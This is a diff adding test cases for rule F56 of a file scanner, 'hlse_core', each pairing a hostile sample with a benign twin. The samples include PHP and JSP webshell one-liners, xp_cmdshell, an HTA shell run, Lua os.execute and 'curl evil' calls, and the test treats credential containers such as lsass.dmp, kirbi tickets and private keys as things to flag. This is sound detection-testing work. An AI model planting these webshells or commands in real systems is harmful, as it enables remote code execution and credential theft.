@@ -9008,6 +9008,111 @@ printf 'machine x\n' > "$XDIR/dh2/.authinfo"
     && check "file: benign authinfo no F56" "0" "1" \
     || check "file: benign authinfo no F56" "0" "0"
 
+# F56: webshell bodies + credential containers
+mkdir -p "$XDIR/ws1" "$XDIR/ws2"
+printf '<?php eval($_POST["x"]); ?>\n' > "$XDIR/ws1/shell.php"
+./hlse_core file "$XDIR/ws1/shell.php" 2>&1 | grep -q "F56" \
+    && check "file: php eval-POST webshell flagged" "0" "0" \
+    || check "file: php eval-POST webshell flagged" "0" "1"
+printf '<?php echo 1; ?>\n' > "$XDIR/ws2/clean.php"
+./hlse_core file "$XDIR/ws2/clean.php" 2>&1 | grep -q "F56" \
+    && check "file: benign php no F56" "0" "1" \
+    || check "file: benign php no F56" "0" "0"
+printf '<%% Runtime.getRuntime().exec(request.getParameter("c")); %%>\n' \
+    > "$XDIR/ws1/shell.jsp"
+./hlse_core file "$XDIR/ws1/shell.jsp" 2>&1 | grep -q "F56" \
+    && check "file: jsp exec-param webshell flagged" "0" "0" \
+    || check "file: jsp exec-param webshell flagged" "0" "1"
+printf '<%%= x %%>\n' > "$XDIR/ws2/clean.jsp"
+./hlse_core file "$XDIR/ws2/clean.jsp" 2>&1 | grep -q "F56" \
+    && check "file: benign jsp no F56" "0" "1" \
+    || check "file: benign jsp no F56" "0" "0"
+printf "EXEC xp_cmdshell 'whoami';\n" > "$XDIR/ws1/q.sql"
+./hlse_core file "$XDIR/ws1/q.sql" 2>&1 | grep -q "F56" \
+    && check "file: sql xp_cmdshell flagged" "0" "0" \
+    || check "file: sql xp_cmdshell flagged" "0" "1"
+printf 'SELECT * FROM users;\n' > "$XDIR/ws2/clean.sql"
+./hlse_core file "$XDIR/ws2/clean.sql" 2>&1 | grep -q "F56" \
+    && check "file: benign sql no F56" "0" "1" \
+    || check "file: benign sql no F56" "0" "0"
+printf '<script>new ActiveXObject("WScript.Shell").Run("x")</script>\n' \
+    > "$XDIR/ws1/p.hta"
+./hlse_core file "$XDIR/ws1/p.hta" 2>&1 | grep -q "F56" \
+    && check "file: hta ActiveX flagged" "0" "0" \
+    || check "file: hta ActiveX flagged" "0" "1"
+printf '<html><body>hi</body></html>\n' > "$XDIR/ws2/clean.hta"
+./hlse_core file "$XDIR/ws2/clean.hta" 2>&1 | grep -q "F56" \
+    && check "file: benign hta no F56" "0" "1" \
+    || check "file: benign hta no F56" "0" "0"
+printf 'x{behavior:url(#evil)}\n' > "$XDIR/ws1/s.css"
+./hlse_core file "$XDIR/ws1/s.css" 2>&1 | grep -q "F56" \
+    && check "file: css behavior flagged" "0" "0" \
+    || check "file: css behavior flagged" "0" "1"
+printf '.x{color:red}\n' > "$XDIR/ws2/s.css"
+./hlse_core file "$XDIR/ws2/s.css" 2>&1 | grep -q "F56" \
+    && check "file: benign css no F56" "0" "1" \
+    || check "file: benign css no F56" "0" "0"
+printf 'os.execute("id")\n' > "$XDIR/ws1/s.lua"
+./hlse_core file "$XDIR/ws1/s.lua" 2>&1 | grep -q "F56" \
+    && check "file: lua os.execute flagged" "0" "0" \
+    || check "file: lua os.execute flagged" "0" "1"
+printf 'BEGIN:VCALENDAR\nATTACH;http://evil/x\nEND:VCALENDAR\n' \
+    > "$XDIR/ws1/e.ics"
+./hlse_core file "$XDIR/ws1/e.ics" 2>&1 | grep -q "F56" \
+    && check "file: ics remote attach flagged" "0" "0" \
+    || check "file: ics remote attach flagged" "0" "1"
+printf 'BEGIN:VCALENDAR\nSUMMARY:x\nEND:VCALENDAR\n' > "$XDIR/ws2/e.ics"
+./hlse_core file "$XDIR/ws2/e.ics" 2>&1 | grep -q "F56" \
+    && check "file: benign ics no F56" "0" "1" \
+    || check "file: benign ics no F56" "0" "0"
+printf '(command "shell" "curl evil")\n' > "$XDIR/ws1/acad.lsp"
+./hlse_core file "$XDIR/ws1/acad.lsp" 2>&1 | grep -q "F56" \
+    && check "file: acad.lsp command flagged" "0" "0" \
+    || check "file: acad.lsp command flagged" "0" "1"
+printf '(defun f () (princ "x"))\n' > "$XDIR/ws2/clean.lsp"
+./hlse_core file "$XDIR/ws2/clean.lsp" 2>&1 | grep -q "F56" \
+    && check "file: benign lsp no F56" "0" "1" \
+    || check "file: benign lsp no F56" "0" "0"
+printf 'system("curl evil");\n' > "$XDIR/ws1/startup.m"
+./hlse_core file "$XDIR/ws1/startup.m" 2>&1 | grep -q "F56" \
+    && check "file: startup.m system flagged" "0" "0" \
+    || check "file: startup.m system flagged" "0" "1"
+printf 'x = 1;\n' > "$XDIR/ws2/startup.m"
+./hlse_core file "$XDIR/ws2/startup.m" 2>&1 | grep -q "F56" \
+    && check "file: benign startup.m no F56" "0" "1" \
+    || check "file: benign startup.m no F56" "0" "0"
+printf 'fake\n' > "$XDIR/ws1/wallet.dat"
+./hlse_core file "$XDIR/ws1/wallet.dat" 2>&1 | grep -q "F56" \
+    && check "file: wallet.dat flagged" "0" "0" \
+    || check "file: wallet.dat flagged" "0" "1"
+printf 'fake\n' > "$XDIR/ws1/t.kirbi"
+./hlse_core file "$XDIR/ws1/t.kirbi" 2>&1 | grep -q "F56" \
+    && check "file: kirbi ticket flagged" "0" "0" \
+    || check "file: kirbi ticket flagged" "0" "1"
+printf 'fake\n' > "$XDIR/ws1/lsass.dmp"
+./hlse_core file "$XDIR/ws1/lsass.dmp" 2>&1 | grep -q "F56" \
+    && check "file: lsass.dmp flagged" "0" "0" \
+    || check "file: lsass.dmp flagged" "0" "1"
+printf '{"logins":[]}\n' > "$XDIR/ws1/logins.json"
+./hlse_core file "$XDIR/ws1/logins.json" 2>&1 | grep -q "F56" \
+    && check "file: logins.json flagged" "0" "0" \
+    || check "file: logins.json flagged" "0" "1"
+printf '%s\n' '-----BEGIN OPENSSH PRIVATE KEY-----xxxx' > "$XDIR/ws1/id_rsa"
+./hlse_core file "$XDIR/ws1/id_rsa" 2>&1 | grep -q "F56" \
+    && check "file: private key flagged" "0" "0" \
+    || check "file: private key flagged" "0" "1"
+printf '%s\n' '-----BEGIN CERTIFICATE-----xxxx' > "$XDIR/ws2/pub.pem"
+pubpem_out=$(./hlse_core file "$XDIR/ws2/pub.pem" 2>&1)
+echo "$pubpem_out" | grep -q 'F56' \
+    && echo "$pubpem_out" | grep -qE 'BLOCK|ISOLATE' \
+    && check "file: public cert not key-level" "0" "1" \
+    || check "file: public cert not key-level" "0" "0"
+printf 'Mozilla/5.0\n.NeTscAPE\nevil.com\tTRUE\t/\tFALSE\t1\tc\tv\n' \
+    > "$XDIR/ws1/cookies.txt"
+./hlse_core file "$XDIR/ws1/cookies.txt" 2>&1 | grep -q "F56" \
+    && check "file: cookies.txt flagged" "0" "0" \
+    || check "file: cookies.txt flagged" "0" "1"
+
 # F56: credential/session carrier files
 printf '{"log":{"entries":[{"request":{"cookies":[{"name":"s","value":"x"}]}}]}}\n' \
     > "$XDIR/x.har"
